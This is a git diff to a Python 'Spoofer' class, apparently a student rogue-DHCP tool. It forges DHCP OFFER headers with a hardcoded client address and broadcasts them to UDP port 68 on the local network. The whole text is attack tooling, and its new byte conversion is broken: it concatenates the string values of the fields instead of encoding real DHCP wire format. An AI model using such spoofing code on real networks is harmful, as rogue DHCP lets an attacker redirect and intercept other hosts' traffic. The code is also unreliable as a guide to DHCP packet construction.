@@ -1,7 +1,8 @@
 import socket as s
 import netifaces as netif
 import ipaddress as ip
-from typing import Dict 
+from typing import Dict
+from collections.abc import Mapping 
 import time #temporário
 
 class Spoofer:
@@ -35,7 +36,7 @@ class Spoofer:
         return mask
     
     @staticmethod
-    def write_offer(dhcp_offer_header : Dict): #TODO: FALTAM OUTROS CAMPOS DO HEADER ALÉM DAS OPTIONS
+    def write_offer(dhcp_offer_header : Dict):
         print(dhcp_offer_header)
         dhcp_offer_header['op']     =   2
         dhcp_offer_header['yiaddr'] =   s.inet_aton('10.132.249.253')
@@ -52,13 +53,31 @@ class Spoofer:
 
         return dhcp_offer_header
 
+    def opt_to_byte(dict):
+        res = ""
+        for k, v in dict.items():
+            res += f"{k}{len(f'{v}')}{v}"
+        return res
+
+    def dict_to_byte(dict):
+        byt = b''
+        for i in dict.values():
+            if isinstance(i, Mapping):
+                i = Spoofer.opt_to_byte(i)
+
+            byt += f"{i}".encode(encoding = 'UTF-8')
+        return byt
+
+
     @staticmethod
     def spoof(dhcp_discover_header : Dict):
         offer_header = Spoofer.write_offer(dhcp_discover_header)
         broadcast = ip.IPv4Network(Spoofer.getIP() + '/' + Spoofer.getNetmask(), False).broadcast_address
 
+        data = Spoofer.dict_to_byte(offer_header)
+
         dport = 68
         udp = s.socket(s.AF_INET, s.SOCK_DGRAM)
-        dest = (broadcast, dport)
-        udp.sendto(bytes(offer_header,"utf-8"), dest) #TODO: CONVERTER DICIONÁRIO (HEADER) PRA BYTES E ENVIAR 
+        dest = (str(broadcast), int(dport))
+        udp.sendto(data, dest)
         udp.close()
